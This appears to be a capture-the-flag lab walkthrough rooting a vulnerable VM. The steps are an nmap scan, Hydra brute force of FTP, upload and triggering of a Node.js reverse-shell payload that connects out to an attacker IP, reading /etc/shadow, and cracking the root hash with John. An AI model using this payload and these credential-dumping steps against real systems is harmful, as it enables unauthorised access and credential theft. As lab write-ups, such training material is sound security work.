# 🔍 Enumeration

## Nmap Scan

First, perform a full port scan against the target machine:

```bash
$ nmap -n -Pn -sSV -p-  --min-rate 5000  192.168.29.188
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-08 03:34 -0700
Nmap scan report for 192.168.29.188
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
3000/tcp open  http    Node.js (Express middleware)
MAC Address: 00:0C:29:3D:07:0A (VMware)
```

### Findings
- Port **21** → FTP
- Port **3000** → Web application running on **Node.js**

# 📂 FTP Enumeration

Lets try to attempt anonymous login:

```bash
ftp 192.168.29.188
Connected to 192.168.29.188.
220 "Hello a.clark, Welcome to your FTP server."
Name (192.168.29.188:arc): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
```

Anonymous login failed, but the banner leaked a valid username:

```bash
a.clark
```

# 🔓 FTP Brute Force

Use Hydra to brute-force the FTP password:

```bash
$ hydra -l a.clark -P /usr/share/wordlists/rockyou.txt ftp://192.168.29.188
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-08 03:36:14

```

## Credentials Found

```bash
Username: a.clark
Password: dragon
```

---

# 📤 FTP Access

Login using the discovered credentials and directory listing:

```bash
$ ftp a.clark@192.168.29.188
Connected to 192.168.29.188.
220 "Hello a.clark, Welcome to your FTP server."
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||23452|)
150 Here comes the directory listing.
drwxrwxrwx    2 1000     1000         4096 Oct 13  2025 .
drwxrwxrwx    2 1000     1000         4096 Oct 13  2025 ..
226 Directory send OK.
ftp>
```

The directory was empty, but writable.

# 🌐 Web Application Analysis

The web application on port **3000** is running on **Node.js**.

<img width="1266" height="372" alt="image" src="https://github.com/user-attachments/assets/e885be49-11b4-4b89-80bc-f780c77f71e0" />

This suggests the uploaded `.js` files may be executed by the server.

# 💣 Reverse Shell Payload

Generated a Node.js reverse shell payload using:

- https://www.revshells.com/

Selected payload:
- **Node.js #2**

## Payload

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(5000, "192.168.29.56", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

Saved as:

```bash
reverseshell.js
```

---

# 📤 Uploading Reverse Shell

Upload the payload through FTP and verifie that it is uploaded:

```bash
ftp> put reversshell.js
local: reversshell.js remote: reversshell.js
229 Entering Extended Passive Mode (|||11743|)
150 Ok to send data.
100% |*****************************************************************
226 Transfer complete.
379 bytes sent in 00:00 (207.81 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||21244|)
150 Here comes the directory listing.
-rw-------    1 1000     1000          379 May 08 18:11 reversshell.js
226 Directory send OK.
ftp> 
```

The "put" command uploads a single file from your local computer to the remote server.

# 🎧 Netcat Listener

Start a listener on the your local machine:

```bash
nc -lvnp 5000
```

---

# 🚀 Remote Code Execution

Trigger the uploaded payload through the browser:

```bash
http://192.168.29.188:3000/reverseshell.js
```

# 🖥 Initial Access

## Verify Current User

```bash
id
uid=1000(a.clark) gid=1000(a.clark) groups=1000(a.clark),42(shadow)
```

### Important Finding
The user belongs to the **shadow** group, which can read `/etc/shadow`.

---

# 🔑 Dumping Password Hashes

Read the shadow file:

```bash
cat /etc/shadow
```

## Root Hash

```bash
root:$y$j9T$9VFLJjKZix0Ugj9YsoOCS.$z0FVk.1CCNx/YRzEmwjcz6z4oYqa7YD6QyXd52jxyLD
```

# 🔓 Cracking Root Password

By researching the hash format online and verifying with AI/tools, the hash was identified as a **yescrypt** hash.

To crack the password hash, use **John the Ripper** with the `--format=crypt` option:

Use John the Ripper:

```bash
$ john --format=crypt -w=/usr/share/wordlists/rockyou.txt hash.txt 
Created directory: /home/arc/.john
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

## Password Recovered

```bash
bassman
```

# 👑 Privilege Escalation

Switch to the root user:

```bash
su -
```

Enter password:

```bash
bassman
```

## Verification

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

Successfully gained root access.

# 🚀 Key Takeaways

- FTP banners can leak usernames.
- Writable upload directories are dangerous when combined with executable environments.
- Membership in the `shadow` group is highly critical.
- Weak passwords remain one of the biggest security issues.
- Always enumerate group memberships after gaining initial access.
